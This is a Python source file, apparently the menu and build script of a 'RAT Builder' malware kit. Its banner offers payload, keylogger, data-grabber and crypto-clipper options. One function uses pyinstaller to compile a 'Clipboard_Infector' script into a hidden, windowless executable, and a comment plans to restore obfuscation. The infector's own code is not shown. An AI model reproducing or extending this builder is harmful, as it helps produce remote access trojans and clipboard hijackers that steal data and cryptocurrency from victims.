import os, sys, platform, ctypes, shutil
from colorama import Fore, Style
from cookies_package import *
from time import sleep


temp = os.getenv("TEMP")



'''
MAIN FUNCTIONS
'''
def cleanup(filename):
    try:
        os.remove(f'{filename}.spec')
        os.remove(f'{filename}.py')
        shutil.rmtree('build')
        shutil.rmtree('dist')
    except: pass


def Create_Crypto_Clipper():
    clear()
    filename = "Clipboard_Infector"
    settitle("Creating Clipboard Infector")
    try:
        # Add back cookies_packge obfusacation after update

        print(f"{Fore.CYAN}\nCreating Clipboard Infector named {Fore.GREEN}{filename}{Fore.CYAN}.exe\n{Fore.RESET}")
        os.system(f"pyinstaller --clean --onefile --noconsole -n {filename} {filename}.py")
        shutil.move(f"{os.getcwd()}\\dist\\{filename}.exe", f"{os.getcwd()}\\{filename}.exe")

        cleanup(filename)

    except Exception as e:
        print(f"{Fore.RED}Error while creating checker: \n\n{Fore.RESET}{e}")
        cleanup(filename)
        input(f"\n\n{Fore.YELLOW}Press enter to continue. . .{Fore.RESET}")
    settitle("Clipboard Infector Created!")
    print(f"\n{Fore.GREEN}Clipboard Infector Created{Fore.RESET}\n")
    input(f'{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.RESET}Enter anything to continue. . .  {Fore.WHITE}')



'''
OTHER FUNCTIONS
'''

def clear():
    system = platform.system()
    if system == 'Windows':
        os.system('cls')
    elif system == 'Linux':
        os.system('clear')
    else:
        print('\n')*120
    return


def settitle(str):
    system = platform.system()
    if system == 'Windows':
        ctypes.windll.kernel32.SetConsoleTitleW(f"{str} | CookiesKush420#9599")
    else:
        os.system(f"\033]0;{str} | CookiesKush420#9599\a")


def print_slow(str):
    for letter in str:
        sys.stdout.write(letter);sys.stdout.flush();sleep(0.05)



'''
BANNERS
'''

banner = Style.BRIGHT + f'''{Fore.LIGHTGREEN_EX}
 

             __           .~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
           _/  \_         |    {Fore.CYAN}Welcome to RAT Builder{Fore.LIGHTGREEN_EX}       |
           ({Fore.LIGHTRED_EX}҂{Fore.WHITE}`_´{Fore.LIGHTGREEN_EX})         {Fore.LIGHTGREEN_EX}|  {Fore.CYAN}New Features Comming Soon...{Fore.LIGHTGREEN_EX}   |
           <,{Fore.LIGHTBLACK_EX}═╦╤─{Fore.YELLOW} ҉ {Fore.LIGHTRED_EX}- -   {Fore.LIGHTGREEN_EX}'─────────────────────────────────'
           _/--\_         
   

    {Fore.LIGHTGREEN_EX}1{Fore.RESET}.{Fore.CYAN} Create PayLoad
    {Fore.LIGHTGREEN_EX}2{Fore.RESET}.{Fore.CYAN} Create Custom PayLoad
    {Fore.LIGHTGREEN_EX}3{Fore.RESET}.{Fore.CYAN} Create Keylogger Add on
    {Fore.LIGHTGREEN_EX}4{Fore.RESET}.{Fore.CYAN} Create Data Grabber Add on
    {Fore.LIGHTGREEN_EX}5{Fore.RESET}.{Fore.CYAN} Create Crypto Clipper Add on
    {Fore.LIGHTGREEN_EX}420{Fore.RESET}.{Fore.LIGHTRED_EX} Exit RAT Builder
{Fore.RESET}'''